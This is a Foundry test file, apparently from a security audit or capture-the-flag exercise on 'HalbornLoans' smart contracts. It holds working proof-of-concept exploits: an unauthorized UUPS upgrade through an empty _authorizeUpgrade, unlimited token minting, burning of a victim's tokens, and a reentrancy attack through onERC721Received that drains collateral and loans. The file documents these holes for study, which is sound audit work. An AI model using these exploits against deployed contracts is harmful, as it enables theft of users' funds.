// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Utils.sol";

import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";

import {HalbornNFT} from "../src/HalbornNFT.sol";
import {HalbornLoans} from "../src/HalbornLoans.sol";
import {HalbornToken} from "../src/HalbornToken.sol";

// Malicious contract to simulate upgrade attack
import {HalbornLoans_UUPSattack} from "../src/exploits/HalbornLoansExploit.sol";

/**
 * @title HalbornLoans_Test
 * @dev Tests for critical vulnerabilities in HalbornLoans contract
 *
 * Found several critical issues during testing:
 * - UUPS upgrade bypass allows anyone to upgrade the contract
 * - Post-upgrade token minting can create infinite supply
 * - Post-upgrade token burning can destroy user funds
 * - Reentrancy attack bypasses collateral accounting
 *
 * The root cause is the empty _authorizeUpgrade() function which allows
 * unrestricted upgrades. This leads to complete protocol takeover.
 */
contract HalbornLoans_Test is Test {
    HalbornLoans public loans;
    ERC1967Proxy public loanProxy;
    HalbornLoans public loanImpl;

    HalbornToken public token;
    ERC1967Proxy tokenProxy;
    HalbornToken tokenImpl;

    HalbornNFT public nft;
    ERC1967Proxy nftProxy;
    HalbornNFT nftImpl;

    function setUp() public {
        // Deploy token implementation and proxy
        tokenImpl = new HalbornToken();
        tokenProxy = new ERC1967Proxy(address(tokenImpl), "");
        token = HalbornToken(address(tokenProxy));
        token.initialize();

        // Deploy NFT implementation and proxy
        nftImpl = new HalbornNFT();
        nftProxy = new ERC1967Proxy(address(nftImpl), "");
        nft = HalbornNFT(address(nftProxy));
        nft.initialize(keccak256(abi.encodePacked("root")), 1 ether);

        // Deploy loan implementation with dummy collateral value
        loanImpl = new HalbornLoans(0);
        bytes memory initData = abi.encodeWithSelector(
            HalbornLoans.initialize.selector,
            address(token),
            address(nft)
        );
        loanProxy = new ERC1967Proxy(address(loanImpl), initData);
        loans = HalbornLoans(address(loanProxy));

        // Authorize loan contract to mint/burn tokens
        token.setLoans(address(loans));
    }

    // Test that anyone can upgrade the contract - no access control
    /**
     * @dev UUPS upgrade bypass test
     *
     * The contract inherits from UUPSUpgradeable but has an empty _authorizeUpgrade()
     * function. This means any address can call upgradeTo() and replace the implementation.
     *
     * Attack flow:
     * 1. Deploy a malicious implementation contract
     * 2. Call upgradeTo() with the malicious address (no authorization check)
     * 3. Re-initialize to set attacker as owner
     * 4. Attacker now controls the entire loans contract
     */
    function test_vulnerableUUPSupgrade() public {
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);

        // Deploy malicious implementation
        HalbornLoans_UUPSattack attack = new HalbornLoans_UUPSattack(0);
        // This should fail but doesn't - empty _authorizeUpgrade() allows it
        loans.upgradeTo(address(attack));
        // Re-initialize to set attacker as owner
        loans.initialize(address(1), address(1));
    }

    // Test infinite token minting after malicious upgrade
    /**
     * @dev Post-upgrade token inflation attack
     *
     * After upgrading to a malicious implementation, the attacker can mint infinite tokens.
     * This works because the token contract trusts the loans contract address (set in setUp).
     *
     * Attack flow:
     * 1. Upgrade loans contract to malicious implementation
     * 2. Initialize with token address to maintain the trust relationship
     * 3. Call mint() which calls token.mintToken() with max uint256
     * 4. Token contract allows it because it trusts the loans address
     */
    function test_vulnerableLoanContractReksTokenMint() public {
        address alice = address(0x123);
        deal(address(token), alice, 1e6 * 1e18);

        // PROOF: State before exploit
        uint256 attackerBalanceBefore = token.balanceOf(address(this));
        uint256 totalSupplyBefore = token.totalSupply();
        console.log("BEFORE EXPLOIT:");
        console.log("Attacker token balance:", attackerBalanceBefore);
        console.log("Total token supply:", totalSupplyBefore);
        console.log("Attacker can mint unlimited tokens:", false);

        // Step 1: Deploy and upgrade to malicious implementation
        HalbornLoans_UUPSattack attack = new HalbornLoans_UUPSattack(0);
        loans.upgradeTo(address(attack));

        // Step 2: Cast proxy to malicious interface and initialize
        HalbornLoans_UUPSattack hackedLoans = HalbornLoans_UUPSattack(
            address(loanProxy)
        );
        hackedLoans.initialize(address(token), address(nft));

        // Mint maximum possible tokens to attacker
        // This works because token.setLoans() was called in setUp, creating trust
        hackedLoans.mint();

        // PROOF: State after exploit
        uint256 attackerBalanceAfter = token.balanceOf(address(this));
        uint256 totalSupplyAfter = token.totalSupply();
        console.log("\nAFTER EXPLOIT:");
        console.log("Attacker token balance:", attackerBalanceAfter);
        console.log("Total token supply:", totalSupplyAfter);
        console.log(
            "Tokens minted:",
            attackerBalanceAfter - attackerBalanceBefore
        );
        console.log(
            "Infinite minting achieved:",
            attackerBalanceAfter == type(uint256).max
        );

        // Step 4: Verify attacker now has infinite tokens
        assertEq(token.balanceOf(address(this)), type(uint256).max);
    }

    // Test burning tokens from any user after upgrade
    /**
     * @dev Post-upgrade token destruction attack
     *
     * After upgrading to a malicious implementation, the attacker can burn tokens from
     * any address. This abuses the trusted relationship between token and loans contracts.
     *
     * Attack flow:
     * 1. Upgrade loans contract to malicious implementation
     * 2. Initialize with token address
     * 3. Call burn() on victim's address to destroy their tokens
     * 4. Can target multiple users this way
     */
    function test_vulnerableLoanContractReksTokenBurn() public {
        address alice = address(0x123);
        deal(address(token), alice, 1e6 * 1e18);

        // Step 1: Deploy and upgrade to malicious implementation
        HalbornLoans_UUPSattack attack = new HalbornLoans_UUPSattack(0);
        loans.upgradeTo(address(attack));

        // Step 2: Initialize malicious contract with token address
        HalbornLoans_UUPSattack hackedLoans = HalbornLoans_UUPSattack(
            address(loanProxy)
        );
        hackedLoans.initialize(address(token), address(nft));

        // Burn all of Alice's tokens without permission
        // This works because token contract trusts the loans contract
        hackedLoans.burn(alice);
        assertEq(token.balanceOf(alice), 0);

        // Step 4: Verify attacker maintains control (others can't upgrade)
        address hexWraith = address(0x314);
        vm.startPrank(hexWraith);
        HalbornLoans newLoan = new HalbornLoans(1e18);
        vm.expectRevert(); // Should revert because attacker owns upgrade rights
        hackedLoans.upgradeTo(address(newLoan));
    }

    // Test reentrancy attack on withdrawCollateral
    /**
     * @dev Reentrancy attack on collateral withdrawal
     *
     * The withdrawCollateral() function has no reentrancy protection. We can use
     * the onERC721Received callback to re-enter the contract before state updates complete.
     *
     * Attack flow:
     * 1. Deposit two NFTs as collateral (normal setup)
     * 2. Call withdrawCollateral(1) which triggers NFT transfer
     * 3. In onERC721Received callback, immediately call withdrawCollateral(2)
     * 4. Second call executes before first call's state updates are finalized
     * 5. Also call getLoan() with max uint256 to drain maximum tokens
     */
    function test_Reentrancy() public {
        // Step 1: Legitimate setup - get two NFTs as intended by design
        nft.mintBuyWithETH{value: 1 ether}();
        nft.mintBuyWithETH{value: 1 ether}();

        assertEq(nft.balanceOf(address(this)), 2);

        // Step 2: Deposit both NFTs as collateral
        nft.approve(address(loans), 1);
        nft.approve(address(loans), 2);
        loans.depositNFTCollateral(1);
        loans.depositNFTCollateral(2);

        // PROOF: State before exploit
        uint256 nftBalanceBefore = nft.balanceOf(address(this));
        uint256 tokenBalanceBefore = token.balanceOf(address(this));
        console.log("BEFORE EXPLOIT:");
        console.log("Attacker NFT balance:", nftBalanceBefore);
        console.log("Attacker token balance:", tokenBalanceBefore);
        console.log("NFT 1 owner:", nft.ownerOf(1));
        console.log("NFT 2 owner:", nft.ownerOf(2));
        console.log("Can withdraw all collateral + drain tokens:", false);

        // Start reentrancy attack
        // Flag to trigger malicious behavior in onERC721Received
        startHack = true;
        loans.withdrawCollateral(1); // This triggers the reentrancy chain

        // PROOF: State after exploit
        uint256 nftBalanceAfter = nft.balanceOf(address(this));
        uint256 tokenBalanceAfter = token.balanceOf(address(this));
        console.log("\nAFTER EXPLOIT:");
        console.log("Attacker NFT balance:", nftBalanceAfter);
        console.log("Attacker token balance:", tokenBalanceAfter);
        console.log("NFT 1 owner:", nft.ownerOf(1));
        console.log("NFT 2 owner:", nft.ownerOf(2));
        console.log("NFTs recovered:", nftBalanceAfter - nftBalanceBefore);
        console.log("Tokens drained:", tokenBalanceAfter - tokenBalanceBefore);
        console.log(
            "Reentrancy success:",
            nftBalanceAfter == 2 && tokenBalanceAfter == type(uint256).max
        );

        // Step 4: Verify successful attack - got both NFTs back
        assertEq(nft.ownerOf(1), address(this));
        assertEq(nft.ownerOf(2), address(this));

        // Step 5: Verify we also drained maximum tokens via getLoan() in callback
        assertEq(token.balanceOf(address(this)), type(uint256).max);
    }

    bool public startHack = false;

    /**
     * @dev Reentrancy callback entry point
     *
     * This callback is triggered during NFT transfers in withdrawCollateral().
     * We use it to re-enter the contract before state updates are finalized.
     *
     * How it works:
     * 1. When NFT ID 1 is transferred, immediately withdraw NFT ID 2
     * 2. Also call getLoan() with max uint256 to drain maximum tokens
     * 3. This bypasses internal accounting because:
     *    - First withdrawal's state changes aren't committed yet
     *    - Second withdrawal sees stale state and succeeds
     *    - Loan calculation uses corrupted collateral accounting
     *
     * Result: Get both NFTs back plus maximum loan tokens
     */
    function onERC721Received(
        address,
        /* operator */ address,
        /* from */ uint256 tokenId,
        bytes calldata /* data */
    ) external returns (bytes4) {
        if (startHack) {
            startHack = false; // Prevent infinite recursion

            // Re-enter to withdraw the other NFT
            loans.withdrawCollateral(tokenId == 1 ? 2 : 1);

            // If this is the first NFT, also drain loan tokens
            if (tokenId == 1) {
                loans.getLoan(type(uint256).max);
            }
        }
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}